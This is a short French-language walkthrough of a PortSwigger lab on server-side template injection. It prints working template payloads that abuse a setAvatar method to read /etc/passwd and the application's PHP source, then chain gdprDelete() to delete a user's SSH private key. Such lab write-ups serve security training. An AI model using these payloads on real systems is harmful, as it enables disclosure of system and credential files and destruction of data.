# Lab

https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit

## Payload

En publiant une image qui n'en est pas une, on voit une erreur qui nous indique deux fichiers :

```
PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/html in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/index.html', 'text/html')
#1 {main}
  thrown in /home/carlos/User.php on line 28
```

- `/home/carlos/User.php`
- `/home/carlos/avatar_upload.php`


Et on apprends que l'avatar est mis à jour : `User->setAvatar('/tmp/index.html', 'text/html')`


On peut essayer de lire `/etc/passwd` : `blog-post-author-display=user.setAvatar('/etc/passwd',+'image/jpeg')`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
```

On peut lire `/etc/avatar_upload.php` : `blog-post-author-display=user.setAvatar('/home/carlos/avatar_upload.php',+'image/jpeg')`

```php
<?php

require_once("./User.php");

if ($_FILES['avatar']['error'] !== 0) {
    throw new Exception("Error in file upload: " . $_FILES['avatar']['error']);
}

if (strpos($_FILES['avatar']['name'], "/") !== false || strpos($_FILES['avatar']['name'], ".") === false) {
    throw new Exception("Uploaded file name is invalid: " . $_FILES['avatar']['name']);
}

$file = "/tmp/" . $_FILES['avatar']['name'];
if (!move_uploaded_file($_FILES['avatar']['tmp_name'], $file)) {
    throw new Exception("Could not move uploaded file '" . $_FILES['avatar']['tmp_name'] . "' to '" . $file . "'");
}

$user = new User($_POST['user'], null, null, null);
$user->setAvatar($file, $_FILES['avatar']['type']);
header('Location: ./');

?>
```

On peut lire `/home/carlos/User.php` : `blog-post-author-display=user.setAvatar('/home/carlos/User.php',+'image/jpeg')`

```php
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?>
```

On voir la méthode `gdprDelete()` qui supprime l'avatar. En mettant notre avatar à `/home/carlos/.ssh/id_rsa` puis en appellant la méthode `gdprDelete()` on peut supprimer la clé privée de Carlos.

`blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa',+'image/jpeg')`

`blog-post-author-display=user.gdprDelete()`

Attention à bien faire un appel pour que la méthode soit appelée, sinon rien ne se passe.